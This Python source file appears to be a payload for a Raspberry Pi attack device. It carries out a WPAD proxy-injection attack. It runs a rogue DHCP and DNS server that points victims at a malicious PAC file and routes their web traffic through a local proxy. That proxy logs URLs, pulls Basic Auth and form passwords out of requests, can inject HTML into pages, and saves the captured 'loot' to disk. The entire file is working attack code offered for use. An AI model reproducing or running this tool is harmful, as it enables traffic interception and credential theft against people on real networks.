#!/usr/bin/env python3
"""
RaspyJack Payload -- WPAD Proxy Injection
==========================================
Author: 7h30th3r0n3

Inject a rogue WPAD configuration via DHCP Option 252 to route
all victim HTTP traffic through a local proxy on the Pi.

Setup / Prerequisites
---------------------
- apt install dnsmasq-base

Flow:
  1) Start rogue DHCP (dnsmasq) with Option 252 pointing to Pi
  2) Serve wpad.dat via mini HTTP server (PAC file)
  3) Start HTTP proxy (port 8888) that logs URLs and captures creds
  4) Optionally inject content into HTTP responses

Controls:
  OK        -- Start / stop attack
  UP / DOWN -- Scroll logs
  KEY1      -- Toggle content injection
  KEY2      -- Export captured data
  KEY3      -- Exit + cleanup

Loot: /root/Raspyjack/loot/WPAD/
"""

import os
import sys
import time
import json
import signal
import threading
import subprocess
import re
import socket
import base64
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
from socketserver import ThreadingMixIn

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont
from payloads._display_helper import ScaledDraw, scaled_font
from payloads._input_helper import get_button

PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = LCD.width, LCD.height
font = scaled_font()

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
LOOT_DIR = "/root/Raspyjack/loot/WPAD"
os.makedirs(LOOT_DIR, exist_ok=True)

DNSMASQ_CONF = "/tmp/raspyjack_wpad_dnsmasq.conf"
PROXY_PORT = 8888
WPAD_PORT = 80
GATEWAY_IP = "10.0.77.1"
DHCP_RANGE_START = "10.0.77.10"
DHCP_RANGE_END = "10.0.77.250"
DHCP_LEASE = "1h"
ROWS_VISIBLE = 7

# ---------------------------------------------------------------------------
# Shared state
# ---------------------------------------------------------------------------
lock = threading.Lock()
status_msg = "Idle"
running = True
attack_active = False
content_injection = False
scroll_pos = 0
dhcp_leases = 0
proxy_connections = 0
urls_logged = []
credentials = []

_dnsmasq_proc = None
_wpad_server = None
_proxy_server = None
_iface = ""

# ---------------------------------------------------------------------------
# Network helpers
# ---------------------------------------------------------------------------

def _get_pi_ip(iface):
    """Get our IP on the given interface."""
    try:
        result = subprocess.run(
            ["ip", "-4", "addr", "show", "dev", iface],
            capture_output=True, text=True, timeout=5,
        )
        for line in result.stdout.splitlines():
            line = line.strip()
            if line.startswith("inet "):
                return line.split()[1].split("/")[0]
    except Exception:
        pass
    return GATEWAY_IP


def _get_active_iface():
    """Return first interface with a default route."""
    try:
        result = subprocess.run(
            ["ip", "route", "show", "default"],
            capture_output=True, text=True, timeout=5,
        )
        for line in result.stdout.splitlines():
            parts = line.split()
            if "dev" in parts:
                return parts[parts.index("dev") + 1]
    except Exception:
        pass
    return "eth0"


# ---------------------------------------------------------------------------
# WPAD / PAC file server
# ---------------------------------------------------------------------------

def _make_pac(pi_ip):
    """Generate a PAC file that routes traffic through our proxy."""
    return (
        f'function FindProxyForURL(url, host) {{\n'
        f'  if (isPlainHostName(host)) return "DIRECT";\n'
        f'  if (shExpMatch(host, "127.0.0.1")) return "DIRECT";\n'
        f'  if (shExpMatch(host, "localhost")) return "DIRECT";\n'
        f'  return "PROXY {pi_ip}:{PROXY_PORT}";\n'
        f'}}\n'
    )


class WPADHandler(BaseHTTPRequestHandler):
    """Serve wpad.dat and wpad.da PAC files."""

    pi_ip = GATEWAY_IP

    def do_GET(self):
        if self.path in ("/wpad.dat", "/wpad.da", "/proxy.pac"):
            pac = _make_pac(self.pi_ip)
            self.send_response(200)
            self.send_header("Content-Type",
                             "application/x-ns-proxy-autoconfig")
            self.send_header("Content-Length", str(len(pac)))
            self.end_headers()
            self.wfile.write(pac.encode())
        else:
            # Redirect everything else to wpad.dat
            self.send_response(302)
            self.send_header("Location", "/wpad.dat")
            self.end_headers()

    def log_message(self, fmt, *args):
        pass  # Suppress default logging


class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    daemon_threads = True


# ---------------------------------------------------------------------------
# HTTP Proxy
# ---------------------------------------------------------------------------

class ProxyHandler(BaseHTTPRequestHandler):
    """Simple HTTP proxy that logs URLs and captures credentials."""

    def _extract_creds(self, headers, body=""):
        """Extract credentials from request."""
        creds_found = []
        # Basic Auth
        auth = headers.get("Authorization", "")
        if auth.lower().startswith("basic "):
            try:
                decoded = base64.b64decode(auth.split(" ", 1)[1]).decode(
                    "utf-8", errors="replace",
                )
                if ":" in decoded:
                    user, pw = decoded.split(":", 1)
                    creds_found.append({"type": "BasicAuth", "user": user,
                                        "password": pw})
            except Exception:
                pass

        # POST form data
        if body:
            user_m = re.search(
                r"(?:user(?:name)?|email|login)=([^&\s]+)", body, re.I,
            )
            pass_m = re.search(
                r"(?:pass(?:word)?|pwd)=([^&\s]+)", body, re.I,
            )
            if user_m and pass_m:
                creds_found.append({"type": "Form", "user": user_m.group(1),
                                    "password": pass_m.group(1)})
        return creds_found

    def _forward_request(self, method):
        """Forward the request to the real server."""
        global proxy_connections

        url = self.path
        with lock:
            proxy_connections += 1
            urls_logged.append({
                "ts": datetime.now().strftime("%H:%M:%S"),
                "method": method,
                "url": url[:200],
            })

        # Read body for POST
        body = ""
        content_len = int(self.headers.get("Content-Length", 0))
        if content_len > 0:
            body = self.rfile.read(content_len).decode("utf-8", errors="replace")

        # Extract credentials
        found_creds = self._extract_creds(self.headers, body)
        if found_creds:
            with lock:
                for c in found_creds:
                    c["url"] = url[:200]
                    c["ts"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    credentials.append(c)

        # Forward via socket
        parsed = urlparse(url)
        host = parsed.hostname or ""
        port = parsed.port or 80

        try:
            sock = socket.create_connection((host, port), timeout=10)
            # Build raw request
            path = parsed.path or "/"
            if parsed.query:
                path += f"?{parsed.query}"
            req_line = f"{method} {path} HTTP/1.0\r\n"
            headers_str = ""
            for key, val in self.headers.items():
                if key.lower() in ("proxy-connection", "proxy-authorization"):
                    continue
                headers_str += f"{key}: {val}\r\n"
            headers_str += "Connection: close\r\n"
            raw_req = req_line + headers_str + "\r\n"
            if body:
                raw_req += body
            sock.sendall(raw_req.encode("utf-8", errors="replace"))

            # Read response
            response_data = b""
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response_data += chunk
            sock.close()

            # Optionally inject content
            with lock:
                inject = content_injection
            if inject and b"</body>" in response_data.lower():
                injection = (
                    b'<div style="position:fixed;bottom:0;width:100%;'
                    b'background:red;color:white;text-align:center;'
                    b'padding:5px;z-index:99999">'
                    b'Network Monitored</div>'
                )
                response_data = response_data.replace(
                    b"</body>", injection + b"</body>",
                )

            self.wfile.write(response_data)
        except Exception:
            self.send_error(502, "Bad Gateway")

    def do_GET(self):
        self._forward_request("GET")

    def do_POST(self):
        self._forward_request("POST")

    def do_HEAD(self):
        self._forward_request("HEAD")

    def do_CONNECT(self):
        """CONNECT tunnels (HTTPS) -- just pass through."""
        self.send_response(200, "Connection Established")
        self.end_headers()

    def log_message(self, fmt, *args):
        pass


class ThreadedProxyServer(ThreadingMixIn, HTTPServer):
    daemon_threads = True


# ---------------------------------------------------------------------------
# dnsmasq configuration
# ---------------------------------------------------------------------------

def _write_dnsmasq_conf(iface, pi_ip):
    """Write dnsmasq config with DHCP Option 252 for WPAD."""
    conf = (
        f"interface={iface}\n"
        f"dhcp-range={DHCP_RANGE_START},{DHCP_RANGE_END},{DHCP_LEASE}\n"
        f"dhcp-option=3,{pi_ip}\n"
        f"dhcp-option=6,{pi_ip}\n"
        f"dhcp-option=252,http://{pi_ip}/wpad.dat\n"
        f"address=/#/{pi_ip}\n"
        f"no-resolv\n"
        f"log-queries\n"
        f"log-facility=/tmp/raspyjack_wpad_dns.log\n"
    )
    with open(DNSMASQ_CONF, "w") as fh:
        fh.write(conf)


# ---------------------------------------------------------------------------
# Attack start / stop
# ---------------------------------------------------------------------------

def _start_attack():
    """Start dnsmasq, WPAD server, and proxy."""
    global attack_active, status_msg, _dnsmasq_proc, _wpad_server
    global _proxy_server, _iface

    _iface = _get_active_iface()
    pi_ip = _get_pi_ip(_iface)

    with lock:
        status_msg = "Configuring..."

    # Configure interface IP if needed
    subprocess.run(
        ["sudo", "ip", "addr", "add", f"{pi_ip}/24", "dev", _iface],
        capture_output=True, timeout=5,
    )

    # Write and start dnsmasq
    _write_dnsmasq_conf(_iface, pi_ip)
    subprocess.run(["sudo", "killall", "dnsmasq"], capture_output=True)
    try:
        _dnsmasq_proc = subprocess.Popen(
            ["sudo", "dnsmasq", "-C", DNSMASQ_CONF, "--no-daemon"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )
    except Exception as exc:
        with lock:
            status_msg = f"dnsmasq failed: {exc}"
        return

    # Start WPAD HTTP server
    WPADHandler.pi_ip = pi_ip
    try:
        _wpad_server = ThreadedHTTPServer(("0.0.0.0", WPAD_PORT), WPADHandler)
        wpad_thread = threading.Thread(
            target=_wpad_server.serve_forever, daemon=True,
        )
        wpad_thread.start()
    except Exception as exc:
        with lock:
            status_msg = f"WPAD server failed: {exc}"
        return

    # Start proxy
    try:
        _proxy_server = ThreadedProxyServer(
            ("0.0.0.0", PROXY_PORT), ProxyHandler,
        )
        proxy_thread = threading.Thread(
            target=_proxy_server.serve_forever, daemon=True,
        )
        proxy_thread.start()
    except Exception as exc:
        with lock:
            status_msg = f"Proxy failed: {exc}"
        return

    # Enable IP forwarding and NAT
    subprocess.run(
        ["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"],
        capture_output=True,
    )
    subprocess.run(
        ["sudo", "iptables", "-t", "nat", "-A", "POSTROUTING",
         "-o", _iface, "-j", "MASQUERADE"],
        capture_output=True,
    )

    with lock:
        attack_active = True
        status_msg = f"WPAD active ({pi_ip})"


def _stop_attack():
    """Stop all services and clean up."""
    global attack_active, _dnsmasq_proc, _wpad_server, _proxy_server

    if _dnsmasq_proc and _dnsmasq_proc.poll() is None:
        _dnsmasq_proc.terminate()
        _dnsmasq_proc.wait(timeout=5)
    _dnsmasq_proc = None

    if _wpad_server:
        _wpad_server.shutdown()
        _wpad_server = None

    if _proxy_server:
        _proxy_server.shutdown()
        _proxy_server = None

    # Cleanup iptables and forwarding
    subprocess.run(
        ["sudo", "iptables", "-t", "nat", "-F"],
        capture_output=True,
    )
    subprocess.run(
        ["sudo", "sysctl", "-w", "net.ipv4.ip_forward=0"],
        capture_output=True,
    )

    # Remove temp files
    for path in (DNSMASQ_CONF, "/tmp/raspyjack_wpad_dns.log"):
        try:
            os.remove(path)
        except OSError:
            pass

    with lock:
        attack_active = False


# ---------------------------------------------------------------------------
# Export
# ---------------------------------------------------------------------------

def _export_data():
    """Export URLs and credentials to loot."""
    with lock:
        data = {
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "proxy_connections": proxy_connections,
            "urls": list(urls_logged),
            "credentials": list(credentials),
        }
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    path = os.path.join(LOOT_DIR, f"wpad_{ts}.json")
    try:
        with open(path, "w") as fh:
            json.dump(data, fh, indent=2)
        with lock:
            global status_msg
            status_msg = f"Exported {len(data['urls'])} URLs"
    except Exception:
        pass


# ---------------------------------------------------------------------------
# DHCP lease counter
# ---------------------------------------------------------------------------

def _count_leases():
    """Periodically count DHCP leases from dnsmasq lease file."""
    global dhcp_leases
    while running:
        try:
            lease_file = "/var/lib/misc/dnsmasq.leases"
            if os.path.exists(lease_file):
                with open(lease_file) as fh:
                    count = sum(1 for line in fh if line.strip())
                with lock:
                    dhcp_leases = count
        except Exception:
            pass
        time.sleep(5)


# ---------------------------------------------------------------------------
# LCD rendering
# ---------------------------------------------------------------------------

def _draw_screen():
    """Render state on LCD."""
    img = Image.new("RGB", (WIDTH, HEIGHT), "BLACK")
    draw = ScaledDraw(img)

    draw.text((2, 2), "WPAD Proxy", fill="CYAN", font=font)

    with lock:
        st = status_msg
        atk = attack_active
        leases = dhcp_leases
        conns = proxy_connections
        sp = scroll_pos
        url_list = list(urls_logged)
        cred_list = list(credentials)
        inj = content_injection

    draw.text((2, 14), st[:22], fill="WHITE", font=font)
    draw.text((2, 28), f"Leases: {leases}", fill="GREEN", font=font)
    draw.text((2, 40), f"Connections: {conns}", fill="GREEN", font=font)
    draw.text((2, 52), f"URLs: {len(url_list)}", fill="WHITE", font=font)
    draw.text((2, 64), f"Creds: {len(cred_list)}", fill="RED" if cred_list else "GRAY", font=font)
    inj_label = "ON" if inj else "OFF"
    draw.text((2, 76), f"Inject: {inj_label}", fill="RED" if inj else "GRAY", font=font)

    # Show recent URLs
    y = 90
    recent = url_list[sp:sp + 2]
    for u in recent:
        line = f"{u['ts']} {u['url'][:14]}"
        draw.text((2, y), line, fill="GRAY", font=font)
        y += 10

    atk_label = "ACTIVE" if atk else "IDLE"
    draw.text((2, 116), f"[{atk_label}] K1=inj K3=exit", fill="GREEN" if atk else "GRAY", font=font)

    LCD.LCD_ShowImage(img, 0, 0)


# ---------------------------------------------------------------------------
# Main loop
# ---------------------------------------------------------------------------

def main():
    global running, scroll_pos, content_injection

    try:
        _draw_screen()

        # Start lease counter
        lease_thread = threading.Thread(target=_count_leases, daemon=True)
        lease_thread.start()

        while running:
            btn = get_button(PINS, GPIO)

            if btn == "KEY3":
                running = False
                break

            elif btn == "OK":
                if not attack_active:
                    threading.Thread(target=_start_attack, daemon=True).start()
                else:
                    threading.Thread(target=_stop_attack, daemon=True).start()

            elif btn == "UP":
                with lock:
                    if scroll_pos > 0:
                        scroll_pos -= 1

            elif btn == "DOWN":
                with lock:
                    max_s = max(0, len(urls_logged) - 2)
                    if scroll_pos < max_s:
                        scroll_pos += 1

            elif btn == "KEY1":
                with lock:
                    content_injection = not content_injection

            elif btn == "KEY2":
                threading.Thread(target=_export_data, daemon=True).start()

            _draw_screen()
            time.sleep(0.15)

    finally:
        running = False

        if attack_active:
            _stop_attack()

        try:
            img = Image.new("RGB", (WIDTH, HEIGHT), "BLACK")
            draw = ScaledDraw(img)
            draw.text((10, 56), "WPAD stopped", fill="RED", font=font)
            LCD.LCD_ShowImage(img, 0, 0)
        except Exception:
            pass

        GPIO.cleanup()


if __name__ == "__main__":
    main()
